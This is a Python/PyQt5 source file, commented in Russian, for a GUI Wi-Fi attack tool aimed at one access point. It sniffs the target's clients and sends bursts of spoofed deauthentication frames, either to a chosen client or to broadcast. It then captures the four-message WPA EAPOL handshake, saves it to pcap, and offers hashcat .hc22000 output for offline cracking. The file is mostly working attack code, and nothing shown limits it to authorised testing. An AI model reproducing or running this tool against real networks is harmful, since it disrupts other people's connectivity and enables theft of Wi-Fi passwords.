#!/usr/bin/env python3

from PyQt5.QtWidgets import (
	QApplication, QTreeView, QVBoxLayout, QHBoxLayout, QWidget, QHeaderView, QPushButton, QLabel, QProgressBar, 
	QStyledItemDelegate, QStyleOptionProgressBar, QStyle, QComboBox, QSizePolicy, QMessageBox, QDialog, QTextEdit, QFileDialog,
	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox, QDoubleSpinBox, QCheckBox, QLayout
)
from PyQt5.QtGui import QStandardItemModel, QStandardItem, QIcon, QPainter, QColor, QPen, QPainterPath, QFont, QKeyEvent
from PyQt5.QtCore import Qt, QEvent, QSize, QTimer, QObject, QMetaObject, Q_ARG, pyqtSlot, QRect, QTimer, QPropertyAnimation, QEasingCurve, QCoreApplication

import sys

from misc import VendorOUI, WiFiPhyManager, WiFiHelper, PCAPWritter
from dot11 import Dot11Parser, PacketBuilder
import subprocess
import shutil
import threading
import pcap
import json
import time

def scale_rssi(rssi_value, min_rssi=-90, max_rssi=-10, new_min=0, new_max=100):
	return max(new_min, min(new_max, (rssi_value - min_rssi) * (new_max - new_min) / (max_rssi - min_rssi) + new_min))

class StylesDeligate(QStyledItemDelegate):
	def __init__(self, parent=None, main_class=None):
		super().__init__(parent)
		self.main_class = main_class

	def initStyleOption(self, option, index):
		super().initStyleOption(option, index)
		if index.column() == 0:
			option.font = QFont("Courier New", 10)

	def paint(self, painter, option, index):
		model = index.model()
		mac = index.data(Qt.UserRole)
		eapol_flag = index.data(Qt.UserRole +1)
		
		#flags = self.main_class.stations[mac]['flags']
		#all_need_flags = all(M in flags for M in ['M1', 'M2', 'M3', 'M4'])

		if index.column() == 0 and eapol_flag == 'EAPOL':
			text = index.data(Qt.DisplayRole)
			painter.save()

			icon = index.data(Qt.DecorationRole)
			icon_size = option.decorationSize.width() if icon else 0
			padding = 5
			text_x = option.rect.x() + icon_size + (padding if icon else 0)
			text_y = option.rect.y() + 2
			font_bold = QFont()

			font_metrics = painter.fontMetrics()
			line_height = font_metrics.height()

			if icon:
				icon_rect = QRect(option.rect.x() +3, option.rect.y() +3, icon_size, icon_size)
				icon.paint(painter, icon_rect, Qt.AlignVCenter)
			
			font = QFont()
			font.setBold(True)
			font.setUnderline(True)
			painter.setFont(font)
			painter.setPen(QColor('#ff0000'))
			painter.drawText(text_x, text_y-1, option.rect.width() - text_x, line_height, Qt.AlignLeft | Qt.AlignTop, text)
			font.setUnderline(False)
			font.setBold(False)
			font.setItalic(True)
			painter.setFont(font)
			painter.setPen(QColor(Qt.gray))
			painter.drawText(text_x +15, text_y + line_height, option.rect.width() - text_x, line_height, Qt.AlignLeft | Qt.AlignTop, "(EAPOL)")

			eapol_icon = QIcon('icons/key.png')
			eapol_icon_rect = QRect(option.rect.x() + icon_size, option.rect.y() + line_height +5, 16, 16)
			eapol_icon.paint(painter, eapol_icon_rect, Qt.AlignVCenter)

			painter.restore()
		else:
			super().paint(painter, option, index)

class ProgressBarDelegate(QStyledItemDelegate):
	def __init__(self, parent=None):
		super().__init__(parent)

	def paint(self, painter, option, index):
		if 1:
			try:
				rssi_value = int(index.data())
			except ValueError:
				return
		
			signal_strength = int(scale_rssi(rssi_value, -85, -40, 0, 100))
			padding = 6
			bar_rect = option.rect.adjusted(padding, padding, -padding, -padding)

			if option.state & QStyle.State_Selected:
				painter.fillRect(option.rect, option.palette.highlight())

			progress_option = QStyleOptionProgressBar()
			progress_option.rect = bar_rect
			progress_option.minimum = 0
			progress_option.maximum = 100
			progress_option.progress = signal_strength
			progress_option.text = f"{rssi_value} dBm"
			progress_option.textVisible = True
			progress_option.textAlignment = Qt.AlignCenter

			painter.save()
			painter.setRenderHint(QPainter.Antialiasing)
			option.widget.style().drawControl(QStyle.CE_ProgressBar, progress_option, painter)
			painter.restore()
		else:
			super().paint(painter, option, index)

	def createEditor(self, parent, option, index):
		return None

class DeauthDialog(QDialog):
	
	def __init__(self, interface, bssid, channel, parent=None):
		super().__init__(parent)

		self.eapol_mask_map = {
			0x0088: ('M1', 'addr1'),
			0x0108: ('M2', 'addr2'),
			0x13c8: ('M3', 'addr1'),
			0x0308: ('M4', 'addr2')
		}

		self.interface = interface
		self.bssid = bssid
		self.channel = channel
		self.vendor_oui = VendorOUI()
		self.stations = {}
		self.ssid = None
		self.first_beacon_flag = False
		self.beacons = 0
		self.beacon_pkt = None
		self.prev_beacon_sn = None
		self.lost_beacons = 0
		self.ap_rssi = 0
		self.running = False
		self.target = self.vendor_oui.get_mac_vendor_mixed(self.bssid)
		self.deauth_work = False

		self.setWindowIcon(QIcon('icons/target.png'))

		self.deauth_reasons = {
			1: "Unspecified reason",
			2: "Previous authentication no longer valid",
			3: "Deauthenticated because sending station is leaving (or has left) IBSS or ESS",
			4: "Disassociated due to inactivity",
			5: "Disassociated because AP is unable to handle all currently associated stations",
			6: "Class 2 frame received from nonauthenticated station",
			7: "Class 3 frame received from nonassociated station",
			8: "Disassociated because sending station is leaving (or has left) BSS",
			9: "Station requesting (re)association is not authenticated with responding station",
			34: "Deauthenticated because of 802.1X authentication failed"
		}

		self.init_ui()
		self.wifiman = WiFiPhyManager()

		self.stop_button.setEnabled(False)
		self.deauth_button.setEnabled(False)
		self.save_pcap_button.setEnabled(False)

		if not self.wifiman.iface_exists(interface):
			self.log(f'[!] Interface {interface} does not exist!')
			self.update_status_label(self.interface_label, 'Interface', '-')
			self.start_button.setEnabled(False)
			return

		self.log(f'[+] Target: {self.vendor_oui.get_mac_vendor_mixed(self.bssid)}')
		
		self.setWindowTitle(f"Target: {self.vendor_oui.get_mac_vendor_mixed(self.bssid)}")

		self.update_ap_rssi_timer = QTimer()
		self.update_ap_rssi_timer.setInterval(5000)
		self.update_ap_rssi_timer.timeout.connect(self.update_ap_rssi)
		self.update_ap_rssi_timer.start()

	def done(self, result):
		QApplication.setOverrideCursor(Qt.WaitCursor)
		try:
			if self.running:
				self.running = False
				if self.monitor_thread.is_alive():
					self.monitor_thread.join()

			while self.deauth_work:
				QCoreApplication.processEvents()
				time.sleep(0.1)
		
		finally:
			QApplication.restoreOverrideCursor()
			super().done(result)

	def add_sta_flag(self, sta_mac, flag):
		if sta_mac in self.stations:			
			if flag not in self.stations[sta_mac]['flags']:
				self.stations[sta_mac]['flags'].append(flag)
	
	def remove_sta_flag(self, sta_mac, flag):
		if sta_mac is self.stations:
			if flag not in self.stations[sta_mac]['flags']:
				self.stations[sta_mac]['flags'].remove(flag)		

	def update_ap_rssi(self): # TODO: смотреть сюда
		if self.running and self.first_beacon_flag:
			rssi_current = self.ap_rssi
			rssi_old = self.rssi_progress.value()
			
			# Если значение не изменилось, ничего не делаем
			if rssi_current == rssi_old:
				return

			# Создаем анимацию для свойства 'value' нашего прогресс-бара
			self.rssi_anim = QPropertyAnimation(self.rssi_progress, b"value")
			self.rssi_anim.setDuration(300) # Длительность в мс (0.3 сек — самое то для RSSI)
			self.rssi_anim.setStartValue(rssi_old)
			self.rssi_anim.setEndValue(rssi_current)
			
			# Делаем движение мягким (InOutQuad — плавный старт и финиш)
			self.rssi_anim.setEasingCurve(QEasingCurve.InOutQuad)
			
			self.rssi_anim.start()

	def init_ui(self):
		# --- ЦЕНТРУЕМ ОКНО ---
		self.setGeometry(*self.center_window(1200, 600))

		# --- ВЕРХНИЙ БЛОК: Две колонки ---
		top_layout = QHBoxLayout()

		# Левая колонка (Статус)
		status_layout = QVBoxLayout()
		self.interface_label = self.create_status_label('Interface', self.interface)
		self.ssid_label = self.create_status_label('SSID', '-')
		self.bssid_label = self.create_status_label('BSSID', self.target)
		self.channel_label = self.create_status_label('Channel', self.channel)
		self.beacons_label = self.create_status_label('Beacons', 0)
		self.packets_label = self.create_status_label('Packets', 0)
		rssi_progress_layout, self.rssi_progress = self.create_progress_bar('RSSI', -90, -20, -90, "- dBm")
		self.rssi_progress.valueChanged.connect(lambda val: self.rssi_progress.setFormat(f"{val} dBm"))

		status_layout.addWidget(self.interface_label)
		status_layout.addWidget(self.ssid_label)
		status_layout.addWidget(self.bssid_label)
		status_layout.addWidget(self.channel_label)
		status_layout.addWidget(self.beacons_label)
		status_layout.addWidget(self.packets_label)
		status_layout.addLayout(rssi_progress_layout)

		# Правая колонка (Настройки)
		settings_layout = QVBoxLayout()
		deauth_packets_layout, self.deauth_packets_edit = self.create_spinbox("Пакетов деавторизации за раз", 1, 500, 127)
		deauth_attempts_layout, self.deauth_attempts_edit = self.create_spinbox("Попыток деавторизации", 1, 100, 3)
		deauth_timeout_layout, self.deauth_timeout_edit = self.create_spinbox("Время между посылками деавторизации", 1, 10, 1, "сек")
		deauth_reason_layout, self.deauth_reason_select = self.create_combobox("Причина деавторизации", self.deauth_reasons, 3)
		hc22000_layout, self.hc22000_checkbox = self.create_checkbox('Создать .hc22000 файл для hashcat (требуется hcxpcapngtool)', True, bool(shutil.which('hcxpcapngtool')))

		settings_layout.addLayout(deauth_packets_layout)
		settings_layout.addLayout(deauth_attempts_layout)
		settings_layout.addLayout(deauth_timeout_layout)
		settings_layout.addLayout(deauth_reason_layout)
		settings_layout.addLayout(hc22000_layout)

		# Добавляем две колонки в верхний блок
		top_layout.addLayout(status_layout, 2)  # Даем статусу больше места
		top_layout.addLayout(settings_layout, 1)  # Настройки чуть уже

		# Фиксируем размер верхнего блока, чтобы он не тянулся вниз
		top_layout.setSizeConstraint(QLayout.SetFixedSize)

		# --- СРЕДНИЙ БЛОК: Кнопки ---
		buttons_layout = QHBoxLayout()
		self.start_button = self.create_button('Начать сканирование', 'icons/refresh', self.start)
		self.stop_button = self.create_button('Стоп', 'icons/cancelled.png', self.stop)
		self.deauth_button = self.create_button('Деавторизовать', 'icons/unlocked.png', self.deauth)
		self.save_pcap_button = self.create_button('Сохранить в .pcap', 'icons/diskette.png', self.save_pcap)

		buttons_layout.addWidget(self.start_button)
		buttons_layout.addWidget(self.stop_button)
		buttons_layout.addWidget(self.deauth_button)
		buttons_layout.addWidget(self.save_pcap_button)
		buttons_layout.addStretch()

		# --- НИЖНИЙ БЛОК: Таблица ---
		self.stations_table = QTableView(self)
		self.stations_table_model = QStandardItemModel(0, 5, self)
		self.stations_table_model.setHorizontalHeaderLabels(['MAC', 'RSSI', 'Frames', 'ACKs', 'Rate', 'Modulation', 'Flags'])

		self.stations_table.setModel(self.stations_table_model)
		self.stations_table.horizontalHeader().setStretchLastSection(True)
		self.stations_table.setEditTriggers(QTableView.NoEditTriggers)
		self.stations_table.setShowGrid(False)
		self.stations_table.verticalHeader().setVisible(False)
		self.stations_table.setSelectionBehavior(QTableView.SelectionBehavior.SelectRows)
		self.stations_table.setIconSize(QSize(32, 32))
		self.stations_table.setItemDelegateForColumn(1, ProgressBarDelegate(self.stations_table))
		self.stations_table.setItemDelegateForColumn(0, StylesDeligate(self.stations_table, self))

		# --- Рзамеры колонок в таблице ---
		self.stations_table.setColumnWidth(0, 200)
		self.stations_table.setColumnWidth(1, 420)
		self.stations_table.setColumnWidth(3, 55)
		self.stations_table.setColumnWidth(4, 80)
		self.stations_table.setColumnWidth(5, 180)

		# Указываем, что таблица должна занимать оставшееся место
		self.stations_table.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)

		# --- ЛОГ ---
		self.log_textarea = QTextEdit()
		self.log_textarea.setFont(QFont("Courier New", 11))
		self.log_textarea.setReadOnly(True)

		# --- ОБЪЕДИНЯЕМ ВСЁ В ГЛАВНЫЙ ЛЭЙАУТ ---
		main_layout = QVBoxLayout()
		main_layout.addLayout(top_layout)
		main_layout.addLayout(buttons_layout)
		main_layout.addWidget(self.stations_table)  # Добавляем таблицу
		main_layout.addWidget(self.log_textarea) # Добавляем лог

		self.setLayout(main_layout)

	def find_row_by_userrole(self, value, role):
		for row in range(self.stations_table_model.rowCount()):
			item = self.stations_table_model.item(row, 0)
			if item and item.data(Qt.UserRole + role) == value:
				return row
		return -1
		
	def center_window(self, w, h):
		output = subprocess.check_output("xrandr | grep '*' | awk '{print $1}' | head -n1", shell=True).decode()
		wh = list(map(int, output.split('x')))
		return (wh[0] // 2 - w // 2, wh[1] // 2 - h // 2, w, h)

	def create_button(self, label, icon, onclick=None):
		button = QPushButton()
		button.setText(label)
		button.setIcon(QIcon(icon))
		button.setIconSize(QSize(24, 24))
		
		if not onclick is None: 
			button.clicked.connect(onclick)

		return button

	def create_checkbox(self, label, checked=True, enabled=True):
		layout = QHBoxLayout()
		checkbox = QCheckBox()
		checkbox.setText(label)
		checkbox.setChecked(checked)
		checkbox.setEnabled(enabled)
		layout.addWidget(checkbox)
		layout.addStretch()

		return layout, checkbox

	def create_spinbox(self, label, min_val, max_val, default, suffix=''):
		layout = QHBoxLayout()
		spinbox = QSpinBox()
		spinbox.setRange(min_val, max_val)
		spinbox.setValue(default)
		layout.addWidget(QLabel(label))
		layout.addWidget(spinbox)
		if suffix:
			layout.addWidget(QLabel(suffix))
		layout.addStretch()

		return layout, spinbox
	
	def create_combobox(self, label, items, selected=None):
		layout = QHBoxLayout()
		layout.addWidget(QLabel(label))
		combobox = QComboBox()

		for key, val in items.items():
			combobox.addItem(f'{key}: {val}', key)

		if not selected is None:
			index = combobox.findData(selected) 
			if index != -1:
				combobox.setCurrentIndex(index)

		layout.addWidget(combobox)
		layout.addStretch()

		return layout, combobox
		
	def create_status_label(self, key, val):
		return QLabel(f'<b>{key}</b>: {val}') 
	

	def create_progress_bar(self, label, min, max, progress, format):
		layout = QHBoxLayout()
		layout.addWidget(QLabel(f'<b>{label}</b>: '))
		progressbar = QProgressBar()		
		progressbar.setMinimum(min)
		progressbar.setMaximum(max)
		progressbar.setValue(progress)
		progressbar.setFormat(format)
		layout.addWidget(progressbar)
		#layout.addStretch()

		return layout, progressbar
	
	def update_status_label(self, qLabel, item, val):
		qLabel.setText(f"<b>{item}: </b>{val}")
		
	@pyqtSlot(QObject, str, str)
	def __update_status_label(self, obj, item, val):
		if isinstance(obj, QLabel):
			obj.setText(f'<b>{item}</b>: {val}')

	@pyqtSlot(int)
	def _update_ap_rssi(self, rssi):
		self.rssi_progress.setFormat(f"{rssi} dBm")
		self.rssi_progress.setValue(rssi)

	@pyqtSlot(str)
	def log(self, log):
		self.log_textarea.append(log)
		self.log_textarea.moveCursor(self.log_textarea.textCursor().End)


	@pyqtSlot(str, str, int, int)
	def __show_message(self, title, message, icon_type, buttons):
		msg = QMessageBox(self)
		msg.setWindowTitle(title)
		msg.setText(message)
		msg.setIcon(QMessageBox.Icon(icon_type))
		msg.setStandardButtons(QMessageBox.StandardButtons(buttons))
		msg.show()

	@pyqtSlot(object, bool)
	def __enbled_elem_toggle(self, elem, enabled):
		elem.setEnabled(enabled)

	@pyqtSlot(str)
	def __add_sta(self, sta_data):
		sta = json.loads(sta_data)
		row = []
		for k, v in sta.items():
			if k in ['eapol', 'state', 'prev_message', 'prev_replay', 'prev_ts', 'eapol_done']: continue

			if k == 'sta_mac':
				item = QStandardItem(QIcon('icons/signal.png'), self.vendor_oui.get_mac_vendor_mixed(v))
				item.setData(v, Qt.UserRole)
				item.setData('WAITED', Qt.UserRole +1)
				row.append(item)
			elif k in ['channel_flags', 'flags']:
				join_char = '+' if k == 'channel_flags' else ' '
				row.append(QStandardItem(join_char.join(v)))
			elif k == 'rate':
				row.append(QStandardItem(f"{v} MB/s"))
			else:
				row.append(QStandardItem(str(v)))

		self.stations_table_model.appendRow(row)
		row_number = self.stations_table_model.rowCount() -1
		if row_number >= 0:
			self.stations_table.setRowHeight(row_number, 40)
	
	@pyqtSlot(str)
	def __update_sta(self, sta_mac):
		row = self.find_row_by_userrole(sta_mac, 0)
		if row != -1:
			sta = self.stations[sta_mac]
			for index, (k, v) in enumerate(sta.items()):
				item = self.stations_table_model.item(row, index)
				if item:
					if k in ['channel_flags', 'flags']:
						join_char = '+' if k == 'channel_flags' else ' '
						item.setText(join_char.join(v))
					elif k == 'sta_mac':
						pass
					elif k == 'rate':
						item.setText(f"{v} MB/s")
					else:
						item.setText(str(v))

	@pyqtSlot(str, int, str)
	def __update_sta_role(self, sta_mac, role_index, role):
		row = self.find_row_by_userrole(sta_mac, 0)
		if row != -1:
			item = self.stations_table_model.item(row, 0)
			item.setData(role, Qt.UserRole + role_index)
	
	def safe_update_sta_role(self, sta_mac, role_index, role):
		QMetaObject.invokeMethod(self, "__update_sta_role", Qt.QueuedConnection,
			Q_ARG(str, sta_mac),
			Q_ARG(int, role_index),
			Q_ARG(str, role)
		)

	def update_status_label(self, qLabel, item, val):
		qLabel.setText(f"<b>{item}: </b>{val}")

	def safe_add_sta(self, sta_data):
		QMetaObject.invokeMethod(self, "__add_sta", Qt.QueuedConnection, 
			Q_ARG(str, sta_data)
		)

	def safe_update_ap_rssi(self, rssi):
		QMetaObject.invokeMethod(self, "_update_ap_rssi", Qt.QueuedConnection, 
			Q_ARG(int, rssi)
		)

	def safe_update_status_label(self, qLabel, item, val):
		QMetaObject.invokeMethod(self, "__update_status_label", Qt.QueuedConnection, 
			Q_ARG(QObject, qLabel),
			Q_ARG(str, str(item)),
			Q_ARG(str, str(val))
		)

	def safe_log(self, log):
		QMetaObject.invokeMethod(self, "log", Qt.QueuedConnection, Q_ARG(str, log))

	def safe_show_message(self, title, message, icon_type, buttons):
		QMetaObject.invokeMethod(self, "__show_message", Qt.QueuedConnection,
			Q_ARG(str, title),
			Q_ARG(str, message),
			Q_ARG(int, icon_type),
			Q_ARG(int, buttons)
		)

	def safe_enbled_elem_toggle(self, elem, enabled):
		QMetaObject.invokeMethod(self, "__enbled_elem_toggle", Qt.QueuedConnection,
			Q_ARG(object, elem),
			Q_ARG(bool, enabled)
		)

	def safe_update_sta(self, sta_mac):
		QMetaObject.invokeMethod(self, "__update_sta", Qt.QueuedConnection,
			Q_ARG(str, sta_mac)
		)

	def start(self):
		self.running = True
		self.wifiman.switch_iface_channel(self.interface, self.channel)
		self.log(f'[+] Switching {self.interface} to channel {self.channel}')
		self.start_monitoring(self.interface)
		if not self.first_beacon_flag:
			self.log(f'[+] Waiting beacon frme from {self.target}')

	def stop(self):
		if self.running:
			self.running = False
			self.monitor_thread.join()

			self.start_button.setEnabled(True)
			self.stop_button.setEnabled(False)
			self.deauth_button.setEnabled(False)

	def save_pcap(self):
		for sta_mac, sta in self.stations.items():
			sta_mac_mixed = self.vendor_oui.get_mac_vendor_mixed(sta_mac)
			mac_name = sta_mac_mixed.replace(":", "")
			pcap_name = f"{self.ssid}_{mac_name}.pcap"
			eapol_data = sta.get('eapol', None)
			if eapol_data:
				eapol_len = len(eapol_data)
				if eapol_len == 4:
					packet = [self.beacon_pkt]
					for eapol_pkt in eapol_data:
						packet.append(eapol_pkt)

					options = QFileDialog.Options()
					file_path, _ = QFileDialog.getSaveFileName(self, "Сохранить как", pcap_name, "PCAP Files (*.pcap)", options=options)
					if file_path:
						try:
							wrpcap = PCAPWritter(file_path)
							wrpcap.write(packet, True)
						except Exception as e:
							print(f"[!] {e}")
			

	def deauth(self):
		self.deauth_button.setEnabled(False)
		selected_indexes = self.stations_table.selectionModel().selectedRows()
		if selected_indexes:
			row = selected_indexes[0].row()
			model = self.stations_table.model()
			self.target_client = model.data(model.index(row, 0), Qt.UserRole).upper()
		else:
			self.target_client = None

		self.deauth_work = True
		self.send_deauth()

	def send_deauth(self):
		sta_mac = self.target_client if self.target_client else 'FF:FF:FF:FF:FF:FF'
		sta_log_mac = self.vendor_oui.get_mac_vendor_mixed(self.target_client) if self.target_client else 'broadcast'
		
		def run():
			pHandle = pcap.pcap(name=self.interface)
			reason_code = self.deauth_reason_select.itemData(self.deauth_reason_select.currentIndex())
			deauth_attempts = self.deauth_attempts_edit.value()
			deauth_packets = self.deauth_packets_edit.value()
			deauth_timeout = self.deauth_timeout_edit.value()

			for i in range(deauth_attempts):
				self.safe_log(f'[+] Sending deauth to {sta_log_mac} as {self.target} (reason={reason_code})')

				for k in range(deauth_packets):
					wifi_pkt = PacketBuilder()
					rt = wifi_pkt.RadioTap()
					dot11 = wifi_pkt.Dot11(0xC0, addr1=self.bssid, addr2=sta_mac, addr3=self.bssid, frag=0, seq=3000+k, duration=314)
					deauth = wifi_pkt.Dot11Deauth(reason_code)
					packet = rt + dot11 + deauth
					pHandle.sendpacket(packet)

				time.sleep(deauth_timeout)
			self.safe_enbled_elem_toggle(self.deauth_button, True)
			self.deauth_work = False

		self.deauth_thread = threading.Thread(target=run, daemon=True)
		self.deauth_thread.start()

	def start_monitoring(self, iface):
		def run():
			#try:
			pHandle = pcap.pcap(name=iface, promisc=True, immediate=True, timeout_ms=100)
			self.safe_enbled_elem_toggle(self.start_button, False)
			self.safe_enbled_elem_toggle(self.stop_button, True)
			self.safe_enbled_elem_toggle(self.deauth_button, True)
			self.process_packets(pHandle)
			#except Exception as e:
			#	self.safe_log(f'[!] {e}')

		self.monitor_thread = threading.Thread(target=run, daemon=True)
		self.monitor_thread.start()

	def process_packets(self, pHandle):
		for ts, pkt in pHandle:
			if not self.running:
				break

			wifi_pkt = Dot11Parser(pkt)
			rssi = wifi_pkt.return_RadioTap_PresentFlag('dbm_Antenna_Signal') or -100
			rate = wifi_pkt.return_RadioTap_PresentFlag('Rate') or 0
			channel_present = wifi_pkt.return_RadioTap_PresentFlag('Channel')
			channel = channel_present.get('channel', 0) if channel_present else 0
			channel_flags = channel_present.get('flags', 0) if channel_present else 'None'

			dot11 = wifi_pkt.return_Dot11()
			type_subtype = wifi_pkt.return_Dot11_frame_control()

			if type_subtype == 0xC0:
				if dot11.addr2 in self.stations:
					self.add_sta_flag(dot11.addr2, 'D')
					self.safe_update_sta(dot11.addr2)

			if type_subtype == 0xD4: # Acknowledgement
				if dot11.addr1 in self.stations:
					acks = self.stations[dot11.addr1]['acks']
					acks += 1
					self.stations[dot11.addr1]['acks'] = acks
					self.safe_update_sta(dot11.addr1)

			if type_subtype == 0x94: # Block ACK req
				if dot11.addr1 in self.stations:
					self.stations[dot11.addr1]['channel_flags'] = channel_flags
					self.stations[dot11.addr1]['rate'] = rate
					self.safe_update_sta(dot11.addr1)

	
			if (type_subtype in [0x08, 0x88]) and self.first_beacon_flag: # Data, QoS Data
				fc_flags = wifi_pkt.return_dot11_framecontrol_flags()
				flag_names = {f.name for f in fc_flags} # Делаем set для скорости
				
				# Проверка на мультикаст (нечетный первый байт ADDR1)
				is_multicast = int(dot11.addr1.split(':')[0], 16) & 1
				
				if not is_multicast and 'more_data' not in flag_names:
					to_ds       = 'to_ds' in flag_names
					from_ds     = 'from_ds' in flag_names
					is_direct   = False
					direct_type = None
					ap_addr     = None
					client_addr = None
					
					if from_ds:
						#is_direct = (dot11.addr2 == dot11.addr3)
						is_direct = dot11.addr1 != 'ff:ff:ff:ff:ff:ff' # Исключаем широковещательные
						is_direct = dot11.addr1[:8] != '01:00:5e' and is_direct # Исключаем IPv4 multicast
						is_direct = dot11.addr1[:8] != '33:33:00' and is_direct # Исключаем IPv6 multicast
						ap_addr = dot11.addr2 or dot11.addr3
						client_addr = dot11.addr1
						direct_type = "AP -> Client"
					elif to_ds:
						#is_direct = (dot11.addr1 == dot11.addr3)
						is_direct = dot11.addr3 != 'ff:ff:ff:ff:ff:ff'# and is_direct # Исключаем широковещательные
						direct_type = "Client -> AP"
						ap_addr = dot11.addr1 or dot11.addr3
						client_addr = dot11.addr2

					if ap_addr.upper() == self.bssid.upper():
						if not client_addr in self.stations:
							sta = {
								"sta_mac": client_addr,
								"rssi": rssi,
								"frames": 1,
								"acks": 0,
								"rate": rate,
								"channel_flags": channel_flags,
								"flags": [],
								"eapol": [],
								"state": None,
								"prev_message": None,
								"prev_replay": None,
								"prev_ts": None,
								"eapol_done": False
							}
							self.stations[client_addr] = sta 
							self.safe_add_sta(json.dumps(sta))
							self.safe_log(f'[+] Client found: {self.vendor_oui.get_mac_vendor_mixed(client_addr)}')
						else:
							frames = self.stations[client_addr]['frames']
							frames += 1
							self.stations[client_addr]['rssi'] = rssi
							self.stations[client_addr]['frames'] = frames
							self.safe_update_sta(client_addr)

			beacon = wifi_pkt.return_Dot11_Beacon_ProbeResponse()
			if beacon:
				bssid = dot11.addr3.upper()
				elt = wifi_pkt.return_Dot11Elt()
				if bssid == self.bssid:
					if not self.first_beacon_flag:
						wifi = WiFiHelper()
						ssid = wifi.get_ap_ssid(wifi_pkt)
						vendor = wifi.get_ap_vendor(wifi_pkt)
						enc_type, unicast_pair_suites, akm_suites = wifi.return_ap_encryptions(beacon, elt)
						self.safe_log(f'[+] Done. SSID="{ssid}", vendor="{vendor}"')
						self.safe_update_status_label(self.ssid_label, 'SSID', ssid)
						self.safe_enbled_elem_toggle(self.deauth_button, True)
						self.ap_rssi = rssi
						self.safe_update_ap_rssi(rssi)
						self.beacon_pkt = pkt
						self.ssid = ssid
						self.prev_beacon_sn = dot11.seq
						self.first_beacon_flag = True
					
					if self.first_beacon_flag:
						beacons_seq_delta = dot11.seq - self.prev_beacon_sn 
						if beacons_seq_delta > 0:
							self.lost_beacons += beacons_seq_delta

					self.prev_beacon_sn = dot11.seq
					self.beacons += 1
					self.ap_rssi = rssi
					self.safe_update_status_label(self.beacons_label, 'Beacons', f'{self.beacons} (Lost: {self.lost_beacons})')

			eapol = wifi_pkt.return_EAPOL_Handshake()
			if eapol:
				eapol_info = eapol.get('info', b'\x00\x00')
				replay_counter = eapol.get('replay_counter', None)

				for eapol_mask, eapol_map in self.eapol_mask_map.items():
					eapol_info_bin = int.from_bytes(eapol_info, 'big')
					if ((eapol_mask & 0xFFF8) == (eapol_info_bin & 0xFFF8)):
						message, sta_addr = eapol_map

				sta_mac = getattr(dot11, sta_addr)

				if sta_mac in self.stations:
					if self.stations[sta_mac]['eapol_done']:
						continue

					src_mac = self.vendor_oui.get_mac_vendor_mixed(dot11.addr2)

					if message == 'M1':
						self.stations[sta_mac]['prev_message'] = 'M1'
						self.stations[sta_mac]['prev_replay'] = replay_counter
						self.stations[sta_mac]['prev_ts'] = ts
						self.stations[sta_mac]['eapol'] = [pkt]
						self.remove_sta_flag(sta_mac, 'M2')
						self.remove_sta_flag(sta_mac, 'M3')
						self.remove_sta_flag(sta_mac, 'M4')
						self.add_sta_flag(sta_mac, 'M1')
						self.safe_update_sta(client_addr)
						self.safe_log(f"[+] Received {message} message from {src_mac}")
					
					if self.stations[sta_mac]['prev_message']:
						delta_ts = ts - self.stations[sta_mac]['prev_ts']
						if delta_ts > 1.0:
							self.safe_log('[!] Timeout!')
							self.stations[sta_mac]['prev_message'] = None
							self.stations[sta_mac]['eapol'] = []
							if self.stations[sta_mac]['prev_message'] != 'M1': continue

						if message == 'M2' and self.stations[sta_mac]['prev_message'] == 'M1':
							if replay_counter == self.stations[sta_mac]['prev_replay']:
								self.stations[sta_mac]['prev_message'] = 'M2'
								self.stations[sta_mac]['prev_ts'] = ts
								self.stations[sta_mac]['eapol'].append(pkt)
								self.add_sta_flag(sta_mac, 'M2')
								self.safe_update_sta(client_addr)
								self.safe_log(f"[+] Received {message} message from {src_mac}")
							else:
								self.stations[sta_mac]['prev_message'] = None

						elif message == 'M3' and self.stations[sta_mac]['prev_message'] == 'M2':
							if replay_counter == self.stations[sta_mac]['prev_replay'] +1:
								self.stations[sta_mac]['prev_message'] = 'M3'
								self.stations[sta_mac]['prev_ts'] = ts
								self.stations[sta_mac]['prev_replay'] = replay_counter
								self.stations[sta_mac]['eapol'].append(pkt)
								self.add_sta_flag(sta_mac, 'M3')
								self.safe_update_sta(client_addr)
								self.safe_log(f"[+] Received {message} message from {src_mac}")
							else:
								self.stations[sta_mac]['prev_message'] = None

						elif message == 'M4' and self.stations[sta_mac]['prev_message'] == 'M3':
							if replay_counter == self.stations[sta_mac]['prev_replay']:
								self.stations[sta_mac]['eapol'].append(pkt)
								self.stations[sta_mac]['prev_message'] = None
								self.stations[sta_mac]['prev_replay'] = None
								self.stations[sta_mac]['prev_ts'] = None
								self.stations[sta_mac]['eapol_done'] = True
								self.safe_enbled_elem_toggle(self.save_pcap_button, True)
								self.add_sta_flag(sta_mac, 'M4')
								self.safe_update_sta(client_addr)
								self.safe_update_sta_role(sta_mac, 1, 'EAPOL')
								self.safe_log(f"[+] Received {message} message from {src_mac}")
								self.safe_log("[+] EAPOL complete done!")